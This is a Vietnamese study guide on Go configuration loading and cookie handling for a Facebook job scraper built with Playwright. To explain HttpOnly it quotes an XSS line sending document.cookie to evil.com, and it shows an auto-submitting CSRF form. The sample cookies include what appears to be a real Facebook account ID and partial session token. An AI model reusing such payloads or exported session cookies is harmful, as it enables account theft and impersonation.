# 📚 LEARNING-02 - Advanced Configuration & Cookie Management

Tài liệu này trả lời các câu hỏi nâng cao về configuration management và cookie handling.

---

## ⚙️ **CONFIGURATION MANAGEMENT**

### ❓ **TODO 1: Tại sao cần nhiều cái read và set envs? Tại sao không gom hết vào .env?**

**Trả lời:**

Đây là **12-Factor App methodology** - best practice cho production apps!

**Lý do KHÔNG gom hết vào .env:**

#### **1. Security & Flexibility** 🔒

```go
// ❌ BAD: Chỉ dùng .env
func Load() *Config {
    godotenv.Load()  // Load .env
    
    return &Config{
        TelegramToken: os.Getenv("TELEGRAM_BOT_TOKEN"),
        // Nếu không có .env file → crash!
    }
}

// ✅ GOOD: Multi-source config
func Load() *Config {
    // 1. Load YAML (default config)
    cfg := loadYAML()
    
    // 2. Load .env (local development)
    godotenv.Load()
    
    // 3. Override với env vars (production)
    if token := os.Getenv("TELEGRAM_BOT_TOKEN"); token != "" {
        cfg.TelegramToken = token
    }
    
    return cfg
}
```

**Priority order (quan trọng!):**
```
Environment Variables (highest) > .env file > YAML config > Default values (lowest)
```

#### **2. Ví dụ thực tế:**

**Scenario 1: Local Development**
```bash
# .env file (local)
TELEGRAM_BOT_TOKEN=dev_token_123
TELEGRAM_CHAT_ID=456

# Run
go run cmd/scraper/main.go
# → Dùng token từ .env
```

**Scenario 2: GitHub Actions (CI/CD)**
```yaml
# .github/workflows/job-search.yml
env:
  TELEGRAM_BOT_TOKEN: ${{ secrets.TELEGRAM_BOT_TOKEN }}
  TELEGRAM_CHAT_ID: ${{ secrets.TELEGRAM_CHAT_ID }}

# Không có .env file!
# → Dùng env vars từ GitHub Secrets
```

**Scenario 3: Docker Production**
```bash
# Không có .env file
docker run \
  -e TELEGRAM_BOT_TOKEN=prod_token_xyz \
  -e TELEGRAM_CHAT_ID=789 \
  scraper

# → Dùng env vars từ docker run
```

**Scenario 4: Kubernetes**
```yaml
# deployment.yaml
env:
  - name: TELEGRAM_BOT_TOKEN
    valueFrom:
      secretKeyRef:
        name: telegram-secret
        key: token

# → Dùng env vars từ Kubernetes Secrets
```

#### **3. Tại sao phức tạp nhưng TỐT HƠN?**

**❌ Chỉ dùng .env:**
```
Problems:
- Phải commit .env vào Git → lộ secrets
- Không flexible cho production
- Không work với CI/CD
- Không work với Docker/K8s
```

**✅ Multi-source config:**
```
Benefits:
- ✅ .env cho local dev (không commit)
- ✅ Env vars cho production (secure)
- ✅ YAML cho default config (commit được)
- ✅ Flexible cho mọi environment
```

#### **4. Best Practice:**

```go
// Load order:
// 1. YAML (default, commit vào Git)
cfg := loadYAML("config.yaml")

// 2. .env (local dev, KHÔNG commit)
godotenv.Load()

// 3. Env vars (production, từ system/Docker/K8s)
if token := os.Getenv("TELEGRAM_BOT_TOKEN"); token != "" {
    cfg.TelegramToken = token  // Override!
}
```

**Tóm tắt:**
- Nhiều source = flexible cho mọi environment
- Env vars > .env > YAML > defaults
- Production KHÔNG dùng .env file!

---

### ❓ **TODO 2: Tại sao không tạo helper function cho validation?**

**Trả lời:**

**CÓ THỂ** tạo helper, nhưng cần cân nhắc trade-offs!

#### **Option 1: Không dùng helper (hiện tại)**

```go
// Validate required fields
if cfg.TelegramToken == "" {
    log.Fatal("TELEGRAM_BOT_TOKEN is required")
}

if cfg.TelegramChatID == 0 {
    log.Fatal("TELEGRAM_CHAT_ID is required")
}
```

**Pros:**
- ✅ Đơn giản, dễ đọc
- ✅ Explicit (rõ ràng từng field)
- ✅ Dễ customize error message

**Cons:**
- ❌ Duplicate code
- ❌ Nhiều if statements

#### **Option 2: Dùng helper function**

```go
// Helper function
func validateRequired(fields map[string]interface{}) error {
    var errors []string
    
    for name, value := range fields {
        switch v := value.(type) {
        case string:
            if v == "" {
                errors = append(errors, fmt.Sprintf("%s is required", name))
            }
        case int64:
            if v == 0 {
                errors = append(errors, fmt.Sprintf("%s is required", name))
            }
        }
    }
    
    if len(errors) > 0 {
        return fmt.Errorf("validation failed:\n  - %s", strings.Join(errors, "\n  - "))
    }
    
    return nil
}

// Sử dụng
err := validateRequired(map[string]interface{}{
    "TELEGRAM_BOT_TOKEN": cfg.TelegramToken,
    "TELEGRAM_CHAT_ID":   cfg.TelegramChatID,
})
if err != nil {
    log.Fatal(err)
}
```

**Pros:**
- ✅ DRY (Don't Repeat Yourself)
- ✅ Dễ thêm fields mới
- ✅ Collect tất cả errors cùng lúc

**Cons:**
- ❌ Phức tạp hơn
- ❌ Mất type safety (dùng interface{})
- ❌ Khó customize per-field

#### **Option 3: Dùng struct tags + reflection (Advanced)**

```go
type Config struct {
    TelegramToken  string `yaml:"telegram_token" validate:"required"`
    TelegramChatID int64  `yaml:"telegram_chat_id" validate:"required"`
    Keywords       []string `yaml:"keywords" validate:"required,min=1"`
}

// Dùng library như go-playground/validator
import "github.com/go-playground/validator/v10"

func Load() *Config {
    cfg := &Config{}
    // ... load config ...
    
    // Validate
    validate := validator.New()
    if err := validate.Struct(cfg); err != nil {
        log.Fatalf("Config validation failed: %v", err)
    }
    
    return cfg
}
```

**Pros:**
- ✅ Declarative (khai báo trong struct)
- ✅ Powerful (nhiều validation rules)
- ✅ Reusable

**Cons:**
- ❌ Cần thêm dependency
- ❌ Overkill cho simple validation

#### **Khuyến nghị:**

**Cho project nhỏ (hiện tại):**
```go
// ✅ Giữ nguyên - đơn giản, rõ ràng
if cfg.TelegramToken == "" {
    log.Fatal("TELEGRAM_BOT_TOKEN is required")
}
```

**Khi có > 10 fields cần validate:**
```go
// ✅ Dùng helper function
func validateRequired(name string, value interface{}) {
    // ...
}
```

**Khi cần complex validation:**
```go
// ✅ Dùng validator library
validate.Struct(cfg)
```

---

## 🍪 **COOKIE MANAGEMENT**

### ❓ **TODO 3: Tại sao có `c.Expires > 0`?**

**Trả lời:**

Vì cookies có 2 loại: **Session cookies** và **Persistent cookies**!

#### **Giải thích:**

**Session Cookie (Expires = -1 hoặc không có):**
```json
{
  "name": "presence",
  "value": "C%7B...",
  "expires": -1  // ← Session cookie!
}
```
- Tồn tại **CHỈ trong session** (khi browser mở)
- Khi đóng browser → cookie bị xóa
- Dùng cho: login state, shopping cart

**Persistent Cookie (Expires > 0):**
```json
{
  "name": "c_user",
  "value": "100068830022845",
  "expires": 1802180028.917  // ← Timestamp in future
}
```
- Tồn tại **lâu dài** (đến khi expires)
- Khi đóng browser → vẫn còn
- Dùng cho: "Remember me", preferences

#### **Code giải thích:**

```go
if c.Expires > 0 {
    pwCookie.Expires = *playwright.Float(c.Expires)
}
// Nếu Expires <= 0 → không set → session cookie
```

**Tại sao cần check `> 0`?**

```go
// Case 1: Persistent cookie
c.Expires = 1802180028.917  // > 0
→ Set expires → Cookie tồn tại đến 2027

// Case 2: Session cookie
c.Expires = -1  // <= 0
→ KHÔNG set expires → Cookie xóa khi đóng browser

// Case 3: Không có expires
c.Expires = 0  // <= 0
→ KHÔNG set expires → Session cookie
```

#### **Ví dụ thực tế:**

**Facebook cookies:**
```json
[
  {
    "name": "c_user",
    "expires": 1802180028,  // ← Persistent (2027)
    "value": "100068830022845"
  },
  {
    "name": "presence",
    "expires": -1,  // ← Session
    "value": "C%7B%22t3%22%3A%5B%5D..."
  }
]
```

**Khi scrape Facebook:**
```go
// Load cookies
cookies := LoadCookies("cookies-facebook.json")

// c_user: expires = 1802180028 > 0
→ Set expires → Login vẫn valid đến 2027

// presence: expires = -1 <= 0
→ Không set expires → Mỗi lần chạy phải login lại? NO!
→ Playwright tự handle session cookies
```

**Tóm tắt:**
- `Expires > 0` = persistent cookie (long-lived)
- `Expires <= 0` = session cookie (browser session only)
- Check `> 0` để phân biệt 2 loại

---

### ❓ **TODO 4: Tại sao check `c.HTTPOnly` và `c.Secure`?**

**Trả lời:**

Vì đây là **security flags** - không phải tất cả cookies đều có!

#### **HTTPOnly Flag** 🔒

**Mục đích:** Ngăn JavaScript access cookie

```go
if c.HTTPOnly {
    pwCookie.HttpOnly = *playwright.Bool(true)
}
```

**Ví dụ:**

**Cookie KHÔNG có HTTPOnly:**
```json
{
  "name": "locale",
  "value": "vi_VN",
  "httpOnly": false  // ← JavaScript có thể đọc
}
```

```javascript
// JavaScript có thể access
document.cookie  // → "locale=vi_VN; ..."
```

**Cookie CÓ HTTPOnly:**
```json
{
  "name": "xs",
  "value": "16%3ADduTmHe7...",
  "httpOnly": true  // ← JavaScript KHÔNG thể đọc
}
```

```javascript
// JavaScript KHÔNG thể access
document.cookie  // → Không thấy "xs" cookie
```

**Tại sao cần HTTPOnly?**

**Scenario: XSS Attack**
```javascript
// Hacker inject script vào website
<script>
  // Steal cookies
  fetch('https://evil.com/steal?cookie=' + document.cookie);
</script>

// Nếu cookie KHÔNG có HTTPOnly:
→ Hacker lấy được token → Hack account!

// Nếu cookie CÓ HTTPOnly:
→ document.cookie không thấy token → An toàn!
```

#### **Secure Flag** 🔐

**Mục đích:** Chỉ gửi cookie qua HTTPS

```go
if c.Secure {
    pwCookie.Secure = *playwright.Bool(true)
}
```

**Ví dụ:**

**Cookie KHÔNG có Secure:**
```json
{
  "name": "locale",
  "value": "vi_VN",
  "secure": false  // ← Gửi qua HTTP và HTTPS
}
```

```
HTTP request:
GET http://facebook.com
Cookie: locale=vi_VN  ← Gửi qua HTTP (không mã hóa!)
```

**Cookie CÓ Secure:**
```json
{
  "name": "xs",
  "value": "16%3ADduTmHe7...",
  "secure": true  // ← CHỈ gửi qua HTTPS
}
```

```
HTTP request:
GET http://facebook.com
Cookie: (không gửi xs)  ← Bảo vệ token!

HTTPS request:
GET https://facebook.com
Cookie: xs=16%3ADduTmHe7...  ← Gửi qua HTTPS (mã hóa)
```

**Tại sao cần Secure?**

**Scenario: Man-in-the-Middle Attack**
```
User → HTTP → Router (hacker) → Facebook

Nếu cookie KHÔNG có Secure:
→ Gửi qua HTTP → Hacker đọc được token → Hack!

Nếu cookie CÓ Secure:
→ Không gửi qua HTTP → Hacker không thấy token → An toàn!
```

#### **Tại sao cần check?**

```go
// Không phải tất cả cookies đều có flags!

// Cookie 1: Security-critical
{
  "name": "xs",  // Auth token
  "httpOnly": true,  // ← Có
  "secure": true     // ← Có
}

// Cookie 2: Non-sensitive
{
  "name": "locale",  // Language preference
  "httpOnly": false,  // ← Không có
  "secure": false     // ← Không có
}

// Nếu KHÔNG check → set sai → lỗi!
```

**Tóm tắt:**
- **HTTPOnly**: Ngăn JavaScript đọc cookie (chống XSS)
- **Secure**: Chỉ gửi qua HTTPS (chống MITM)
- Check trước khi set vì không phải cookie nào cũng có

---

### ❓ **TODO 5: Tại sao SameSite có 3 giá trị: Lax, Strict, None?**

**Trả lời:**

**SameSite** ngăn chặn **CSRF attacks** với 3 mức độ bảo vệ!

#### **CSRF Attack là gì?**

**Scenario:**
```
1. Bạn login Facebook → Cookie được set
2. Bạn vào website evil.com
3. evil.com có code:
   <form action="https://facebook.com/post" method="POST">
     <input name="message" value="I got hacked!">
   </form>
   <script>document.forms[0].submit()</script>

4. Browser TỰ ĐỘNG gửi Facebook cookie!
5. Facebook nghĩ request từ bạn → Post "I got hacked!"
```

**SameSite ngăn chặn điều này!**

#### **1. SameSite=Strict** 🔒 (Bảo vệ cao nhất)

```json
{
  "name": "xs",
  "value": "token123",
  "sameSite": "Strict"
}
```

**Rule:** Cookie CHỈ gửi khi request từ **CÙNG SITE**

**Ví dụ:**
```
✅ facebook.com → facebook.com
   Cookie: xs=token123  (Gửi)

❌ evil.com → facebook.com
   Cookie: (KHÔNG gửi xs)  (Chặn CSRF!)

❌ google.com → facebook.com (click link)
   Cookie: (KHÔNG gửi xs)  (Chặn cả link!)
```

**Pros:** Bảo vệ tốt nhất
**Cons:** Khi click link từ Google → Facebook, phải login lại!

#### **2. SameSite=Lax** ⚖️ (Cân bằng)

```json
{
  "name": "c_user",
  "value": "100068830022845",
  "sameSite": "Lax"
}
```

**Rule:** Cookie gửi khi:
- ✅ Same-site requests
- ✅ Top-level navigation (GET only)
- ❌ Cross-site POST/PUT/DELETE

**Ví dụ:**
```
✅ facebook.com → facebook.com
   Cookie: c_user=100...  (Gửi)

✅ google.com → facebook.com (click link - GET)
   Cookie: c_user=100...  (Gửi - UX tốt!)

❌ evil.com → facebook.com (POST form)
   Cookie: (KHÔNG gửi)  (Chặn CSRF!)
```

**Pros:** Bảo vệ tốt + UX tốt
**Cons:** Vẫn có thể bị CSRF với GET requests

#### **3. SameSite=None** 🔓 (Không bảo vệ)

```json
{
  "name": "tracking",
  "value": "abc123",
  "sameSite": "None",
  "secure": true  // ← BẮT BUỘC phải có Secure!
}
```

**Rule:** Cookie gửi **MỌI LÚC** (cross-site)

**Ví dụ:**
```
✅ facebook.com → facebook.com
   Cookie: tracking=abc123  (Gửi)

✅ evil.com → facebook.com
   Cookie: tracking=abc123  (Gửi)

✅ Mọi site → facebook.com
   Cookie: tracking=abc123  (Gửi)
```

**Khi nào dùng None?**
- Embedded content (iframe)
- Third-party integrations
- Tracking cookies

**⚠️ Lưu ý:** `SameSite=None` BẮT BUỘC phải có `Secure=true`!

#### **Code giải thích:**

```go
switch c.SameSite {
case "Lax":
    pwCookie.SameSite = playwright.SameSiteAttributeLax
case "Strict":
    pwCookie.SameSite = playwright.SameSiteAttributeStrict
case "None":
    pwCookie.SameSite = playwright.SameSiteAttributeNone
}
```

**Facebook cookies example:**
```json
[
  {
    "name": "xs",  // Auth token
    "sameSite": "None"  // ← Cho phép cross-site (API calls)
  },
  {
    "name": "wd",  // Window dimensions
    "sameSite": "Lax"  // ← Cân bằng
  },
  {
    "name": "presence",  // Online status
    "sameSite": "Lax"
  }
]
```

#### **So sánh:**

| SameSite | CSRF Protection | UX | Use Case |
|----------|----------------|-----|----------|
| **Strict** | ⭐⭐⭐ Cao nhất | ❌ Kém | Banking, sensitive |
| **Lax** | ⭐⭐ Tốt | ✅ Tốt | Default, most sites |
| **None** | ❌ Không | ✅ Tốt | Tracking, iframe |

**Tóm tắt:**
- **Strict**: Chỉ same-site (bảo vệ cao)
- **Lax**: Same-site + top-level GET (cân bằng)
- **None**: Mọi request (cần Secure=true)

---

## 📂 **COOKIE PATH MANAGEMENT**

### ❓ **TODO 6: Có nên tạo `.cookies` riêng cho Go scraper?**

**Trả lời:**

**KHÔNG CẦN!** Nên **SHARE** cookies giữa Node.js và Go!

#### **Lý do:**

**1. Cookies là SAME DATA** 🍪
```
Node.js scraper và Go scraper:
- Cùng scrape Facebook
- Cùng cần login
- Cùng dùng cookies

→ Tại sao lại tách riêng?
```

**2. Tránh duplicate** 📦
```
❌ BAD: Tách riêng
openclaw-automation/
├── .cookies/
│   └── cookies-facebook.json  ← Node.js cookies
└── go-version/
    └── .cookies/
        └── cookies-facebook.json  ← Go cookies (duplicate!)

Problems:
- Phải update 2 nơi khi cookies expire
- Waste disk space
- Confusing
```

```
✅ GOOD: Share cookies
openclaw-automation/
├── .cookies/
│   └── cookies-facebook.json  ← Shared!
├── execution/  (Node.js)
└── go-version/  (Go)
    └── (reference to ../.cookies/)

Benefits:
- Single source of truth
- Update 1 lần, cả 2 dùng
- Clean
```

**3. Current setup is CORRECT** ✅
```go
// configs/config.yaml
cookies_path: "../.cookies"  // ← Đúng rồi!

// Relative to: go-version/
// Points to: openclaw-automation/.cookies/
```

**4. Workflow:**
```bash
# Update cookies (1 lần)
cd openclaw-automation
# Export cookies từ browser
# → Save to .cookies/cookies-facebook.json

# Node.js scraper dùng
cd execution
node job-search.js
# → Load từ ../.cookies/cookies-facebook.json

# Go scraper dùng (CÙNG FILE!)
cd ../go-version
go run cmd/scraper/main.go
# → Load từ ../.cookies/cookies-facebook.json
```

#### **Khi nào NÊN tách riêng?**

**Chỉ khi:**
- ✅ Go scraper dùng **ACCOUNT KHÁC**
- ✅ Go scraper scrape **PLATFORM KHÁC**
- ✅ Cookies có **FORMAT KHÁC** (không tương thích)

**Nhưng hiện tại:**
- ❌ Cùng account
- ❌ Cùng platform (Facebook)
- ❌ Cùng format (JSON)

→ **KHÔNG CẦN tách!**

#### **Best Practice:**

```
openclaw-automation/
├── .cookies/              ← Shared cookies
│   ├── cookies-facebook.json
│   ├── cookies-linkedin.json
│   └── cookies-vercel.json
│
├── execution/             ← Node.js scraper
│   └── scrapers/
│       └── facebook.js    → Load from ../.cookies/
│
└── go-version/  ← Go scraper
    └── internal/
        └── scraper/
            └── facebook/
                └── scraper.go  → Load from ../../.cookies/
```

**Tóm tắt:**
- ✅ Share cookies giữa Node.js và Go
- ✅ Current path `../.cookies` là ĐÚNG
- ❌ KHÔNG cần tạo `.cookies` riêng
- ✅ Single source of truth!

---

## 🎓 **TÓM TẮT**

### **Configuration**
- Multi-source config = flexible (YAML + .env + env vars)
- Priority: Env vars > .env > YAML > defaults
- Helper function: Tùy project size (nhỏ = không cần)

### **Cookies**
- **Expires > 0**: Persistent cookie (long-lived)
- **HTTPOnly**: Chống XSS (JavaScript không đọc được)
- **Secure**: Chỉ gửi qua HTTPS (chống MITM)
- **SameSite**: Chống CSRF (Strict/Lax/None)
- **Cookie path**: Share giữa Node.js và Go!

---

**Chúc bạn học tốt! 🚀**
